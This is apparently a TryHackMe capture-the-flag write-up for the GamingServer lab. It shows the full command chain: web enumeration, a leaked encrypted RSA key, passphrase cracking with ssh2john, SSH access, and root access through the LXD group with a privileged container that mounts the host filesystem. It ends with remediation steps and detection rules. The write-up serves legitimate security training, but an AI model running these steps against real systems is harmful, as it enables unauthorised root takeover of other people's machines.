# GamingServer - Cryptographic Key Extraction, Passphrase Recovery, and LXD Namespace Abuse

**Platform:** TryHackMe | **Target OS:** Linux (Ubuntu 18.04) | **Difficulty:** Easy  
**Focus:** Information Disclosure, OpenSSL Encrypted Key Cracking (`ssh2john`), Linux User Namespaces, LXD Group Privilege Escalation (`lxc`)

---

## 1. Executive Summary & Attack Chain

During this security assessment, an end-to-end host takeover was executed against the **GamingServer** target (`10.130.146.240`). The attack path involved passive data leakage across the web root, offline cryptographic passphrase cracking, and exploitation of container virtualization permissions.

The kill-chain progressed through the following tactical stages:
1. **Network Reconnaissance & Information Gathering:** Network discovery confirmed OpenSSH and an Apache HTTP web service. Content enumeration exposed sensitive unindexed directories (`/secret`, `/uploads`), revealing an encrypted OpenSSL private RSA key and a target-specific password wordlist.
2. **Key Recovery & Initial Access:** The encrypted RSA key file (`secret.txt`) was parsed using `ssh2john`. A targeted dictionary attack recovered the private key passphrase (`letmein`). Utilizing this key, initial access was gained over SSH as the low-privilege user `john`.
3. **Local Enumeration:** System context analysis revealed user `john` maintained secondary membership in the local `lxd` group, granting write access to the LXD UNIX control socket.
4. **Privilege Escalation via Host Root Mounting:** By importing a stripped Alpine Linux container image and setting the configuration parameter `security.privileged=true`, container UID `0` was directly mapped to host kernel UID `0`. The host's root filesystem (`/`) was mounted into the container at `/mnt/root`, bypassing all Discretionary Access Controls (DAC) and yielding immediate administrative file access (`root.txt`).

### Attack Kill-Chain Diagram
```text
[ Port 80 Web Discovery ] ─────> Uncovered Exposed Files: Encrypted RSA Key + Custom Wordlist
               │
               ▼
[ Cryptographic Cracking ] ────> ssh2john + John the Ripper -> Recovered Passphrase: "letmein"
               │
               ▼
[ SSH Access (Port 22) ] ──────> Interactive Shell as Low-Privilege User: 'john' (UID 1000)
               │
               ▼
[ Group Audit & Enumeration ] ─> Member of 'lxd' Group -> Access to LXD Control Socket
               │
               ▼
[ LXD Namespace Breakout ] ────> Spawn 'security.privileged=true' Container & Mount Host '/'
               │
               ▼
[ Host File System Takeover ] ─> Direct Access to /mnt/root/root/root.txt (Root File Access)
```

---

## 2. Network Reconnaissance & Surface Mapping

### Nmap Service Scan
A non-intrusive TCP port scan was conducted to identify listening daemons and service banners:

```bash
 ❯ nmap -sV -sC -T4 10.130.146.240
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-09 03:18 +0300
Nmap scan report for 10.130.146.240
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.32 seconds
```

### Perimeter Enumeration
- **Port 22 (SSH):** Running OpenSSH 7.6p1 on Ubuntu. Public-key authentication is enforced.
- **Port 80 (HTTP):** Running Apache 2.4.29 hosting a web interface entitled *"House of danak"*.

Targeted web directory discovery was performed using `gobuster` against standard dictionary sets:

```bash
❯ gobuster dir -u http://10.130.146.240 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.146.240
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 2762]
about.php            (Status: 200) [Size: 2213]
about.html           (Status: 200) [Size: 1435]
uploads              (Status: 301) [Size: 318] [--> http://10.130.146.240/uploads/]
robots.txt           (Status: 200) [Size: 33]
secret               (Status: 301) [Size: 317] [--> http://10.130.146.240/secret/]
myths.html           (Status: 200) [Size: 3067]
Progress: 58084 / 882232 (6.58%)
```

---

## 3. Initial Access & Encrypted SSH Key Recovery

### Sensitive Information Disclosure
Inspection of directory paths discovered through enumeration (`/uploads` and `/secret`) resulted in the discovery of two files:
1. A plaintext wordlist containing seasonal strings, administrative default credentials, and common phrases (`pass_server.txt`).
2. An encrypted PEM-formatted RSA private key (`secret.txt`).

Extracted wordlist:
```text
Spring2017
Spring2016
Spring2015
Spring2014
Spring2013
spring2017
spring2016
spring2015
spring2014
spring2013
Summer2017
Summer2016
Summer2015
Summer2014
Summer2013
summer2017
summer2016
summer2015
summer2014
summer2013
......
......
......
```

Recovered encrypted RSA Private Key:
```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

### Cryptographic Mechanics & Passphrase Cracking
The retrieved key includes standard OpenSSL encapsulation headers:
- `Proc-Type: 4,ENCRYPTED`: Denotes that the subsequent Base64-encoded ASN.1 structure is encrypted using a symmetric key.
- `DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547`: Defines the cipher as **AES-128 in Cipher Block Chaining (CBC)** mode, using the 16-byte hex value `82823EE792E75948EE2DE731AF1A0547` as the Initialization Vector (IV) and salt.

Under the hood, OpenSSL derives the 128-bit symmetric decryption key using its legacy Key Derivation Function (`EVP_BytesToKey` using MD5) applied against the user-supplied passphrase concatenated with the salt/IV:
$$K = \text{MD5}(\text{Passphrase} \parallel \text{IV}[0..7])$$

The tool `ssh2john` extracts this encrypted block, the salt, and the cipher identifier, converting it into a standardized hash format:

```bash
❯ ssh2john secret.txt > hash_rsa.txt
❯ john --wordlist=pass_server.txt hash_rsa.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secret.txt)
1g 0:00:00:00 DONE (2026-09-09 03:33) 25.00g/s 5550p/s 5550c/s 5550C/s 2003..starwars
Session completed
```

The offline dictionary attack verified the passphrase: **`letmein`**.

### Remote SSH Access
Authenticating as user `john` using the unlocked private key:

```bash
❯ ssh -i secret john@10.130.146.240
The authenticity of host '10.130.146.240 (10.130.146.240)' can't be established.
ED25519 key fingerprint is: SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.130.146.240' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'secret':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep  9 00:38:35 UTC 2026

  System load:  0.0               Processes:           100
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 35%               IP address for ens5: 10.130.146.240
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

The user flag was obtained: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`.

---

## 4. Local Enumeration & Environment Discovery

A standard audit of SUID binaries was executed across the host:

```bash
john@exploitable:~$ find / -perm -4000 -type f 2>/dev/null
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/bin/ping
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newuidmap
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
```

The binary `/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic` and snap packages hinted at container virtualization installations. An audit of group memberships confirmed `john` was part of the `lxd` secondary group.

---

## 5. Privilege Escalation & OS Mechanics (LXD Container Mount)

### Theoretical Mechanics: LXD Group Vulnerability & Linux Namespaces
Linux containers utilize **cgroups** and **namespaces** (PID, Mount, IPC, Network, UTS, and User) to provide workload isolation while sharing the host kernel.
1. **The LXD Architecture:** The LXD daemon runs as `root` (UID 0) and exposes a local UNIX domain socket (typically `/var/snap/lxd/common/lxd/unix.socket` or `/var/lib/lxd/unix.socket`). Write access to this socket is granted to any user belonging to the `lxd` group.
2. **User Namespace Mapping (`security.privileged=true`):** In unprivileged containers, the Linux kernel maps container UID 0 to an unprivileged high UID on the host (e.g., UID `100000` via `/etc/subuid`). When the configuration flag `security.privileged=true` is supplied, **user namespace isolation is explicitly disabled**. The container’s UID 0 maps 1:1 with the host's actual kernel UID 0.
3. **Arbitrary Filesystem Mounts:** Because the LXD daemon runs as root, requests to attach a disk device (`disk source=/ path=/mnt/root recursive=true`) instruct the kernel to mount the physical host filesystem directly into the container's mount namespace. Consequently, an unprivileged member of the `lxd` group can execute commands inside the container as UID 0 against the entire host file structure, circumventing standard Linux Discretionary Access Controls (DAC).

### Payload Staging & File Delivery
An Alpine Linux image was prepared on the attacking host and staged via a local Python HTTP server:

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.130.146.240 - - [09/Sep/2026 03:43:45] code 404, message File not found
10.130.146.240 - - [09/Sep/2026 03:43:45] "GET /alpine-v3.20-x86_64-20240823_1858.tar.gz HTTP/1.1" 404 -
10.130.146.240 - - [09/Sep/2026 03:45:19] "GET /alpine-v3.24-x86_64-20260909_0342.tar.gz HTTP/1.1" 200 -
```

On the target, initial file retrieval attempts experienced operational port/path mismatches before successfully fetching the target image over port 80:

```bash
john@exploitable:~$ wget http://192.168.192.11:8000/alpine-v3.20-x86_64-20240823_1858.tar.gz
--2026-09-09 00:43:35--  http://192.168.192.11:8000/alpine-v3.20-x86_64-20240823_1858.tar.gz
Connecting to 192.168.192.11:8000... failed: Connection refused.
john@exploitable:~$ wget http://192.168.192.11:80/alpine-v3.20-x86_64-20240823_1858.tar.gz
--2026-09-09 00:43:45--  http://192.168.192.11/alpine-v3.20-x86_64-20240823_1858.tar.gz
Connecting to 192.168.192.11:80... connected.
HTTP request sent, awaiting response... 404 File not found
2026-09-09 00:43:45 ERROR 404: File not found.

john@exploitable:~$ ls
user.txt
john@exploitable:~$ wget http://192.168.192.11:8000/alpine-v3.24-x86_64-20260909_0342.tar.gz
--2026-09-09 00:44:56--  http://192.168.192.11:8000/alpine-v3.24-x86_64-20260909_0342.tar.gz
Connecting to 192.168.192.11:8000... failed: Connection refused.
john@exploitable:~$ wget http://192.168.192.11:443/alpine-v3.24-x86_64-20260909_0342.tar.gz
--2026-09-09 00:45:11--  http://192.168.192.11:443/alpine-v3.24-x86_64-20260909_0342.tar.gz
Connecting to 192.168.192.11:443... failed: Connection refused.
john@exploitable:~$ wget http://192.168.192.11/alpine-v3.24-x86_64-20260909_0342.tar.gz
--2026-09-09 00:45:19--  http://192.168.192.11/alpine-v3.24-x86_64-20260909_0342.tar.gz
Connecting to 192.168.192.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4090642 (3.9M) [application/gzip]
Saving to: ‘alpine-v3.24-x86_64-20260909_0342.tar.gz’

alpine-v3.24-x86_64-20260909_0342.tar.gz        100%[======================================================================================================>]   3.90M   291KB/s    in 14s

2026-09-09 00:45:33 (290 KB/s) - ‘alpine-v3.24-x86_64-20260909_0342.tar.gz’ saved [4090642/4090642]
```

### Container Setup and Host Compromise
The downloaded rootfs was imported into the LXD image store. Initial syntax typos were corrected, and the container was initialized with root access over the host disk:

```bash
john@exploitable:~$ lxc image import alpine-v3.20-x86_64-20240823_1858.tar.gz --alias myimage
Error: open alpine-v3.20-x86_64-20240823_1858.tar.gz: no such file or directory
john@exploitable:~$ ls
alpine-v3.24-x86_64-20260909_0342.tar.gz  user.txt
john@exploitable:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:~$ lxc image import alpine-v3.20-x86_64-20240823_1858.tar.gz --alias myimage
Error: open alpine-v3.20-x86_64-20240823_1858.tar.gz: no such file or directory
john@exploitable:~$ ls
alpine-v3.24-x86_64-20260909_0342.tar.gz  user.txt
john@exploitable:~$ lxc image import alpine-v3.24-x86_64-20260909_0342.tar.gz --alias myimage
Image imported with fingerprint: 1ad4ccc2d50876bbe01efeb2b6271f81d5cf8d503abb3bbc2db814badc0607f4
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 1ad4ccc2d508 | no     | alpine v3.24 (20260909_03:42) | x86_64 | 3.90MB | Sep 9, 2026 at 12:50am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # whoami
root
~ # ls
~ # cd /root
~ # ls
~ # id
uid=0(root) gid=0(root)
~ # lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
/bin/sh: lxc: not found
~ # cd /mnt/root
/mnt/root # ls
bin             dev             initrd.img      lib64           mnt             root            snap            sys             var
boot            etc             initrd.img.old  lost+found      opt             run             srv             tmp             vmlinuz
cdrom           home            lib             media           proc            sbin            swap.img        usr             vmlinuz.old
/mnt/root # cd ..
/mnt # ls
root
/mnt # cat root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
/mnt # 
```

The root flag was retrieved from `/mnt/root/root/root.txt`: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

| Vulnerability / Finding | Severity | Technical Remediation |
| :--- | :--- | :--- |
| **Membership in `lxd` Group** | **Critical** | Remove non-root users from the `lxd` group (`gpasswd -d john lxd`). Direct access to the LXD daemon socket must be treated as equivalent to complete root privilege. |
| **Exposed Private Keys & Wordlists** | **High** | Remove exposed credentials and keys from web-accessible directories (`/uploads`, `/secret`). Restrict directory indexing and enforce strict ACLs. |
| **Weak Key Passphrase** | **Medium** | Enforce strong passphrases on private SSH keys (minimum 16 characters, high entropy) to prevent offline dictionary/brute-force recovery. |
| **Container Isolation Policy** | **Medium** | Enforce unprivileged containers by setting `security.privileged=false` globally and disable raw disk device passthrough for regular users. |

---

### Detection Engineering

#### 1. Auditd Monitoring (LXD UNIX Socket Access)
To monitor interaction with the LXD daemon socket, add an audit rule targeting `/var/lib/lxd/unix.socket` or `/var/snap/lxd/common/lxd/unix.socket`:

```text
-w /var/snap/lxd/common/lxd/unix.socket -p rwxa -k lxd_socket_access
-w /var/lib/lxd/unix.socket -p rwxa -k lxd_socket_access
```

#### 2. Sigma Rule (LXD Privileged Container Creation / Host Mount)
```yaml
title: Privileged LXD Container Creation with Host Root Mount
id: 9c34a2e2-0c91-4475-8f67-8cfad8748361
status: experimental
description: Detects command-line execution patterns associated with LXD group abuse to mount the host root filesystem into a privileged container.
logsource:
  category: process_creation
  product: linux
detection:
  selection_init:
    CommandLine|contains|all:
      - 'lxc'
      - 'init'
      - 'security.privileged=true'
  selection_mount:
    CommandLine|contains|all:
      - 'lxc'
      - 'config'
      - 'device'
      - 'disk'
      - 'source=/'
  condition: selection_init or selection_mount
falsepositives:
  - Legitimate administrative container deployment requiring direct host device mapping.
level: high
tags:
  - attack.privilege_escalation
  - attack.t1611
```
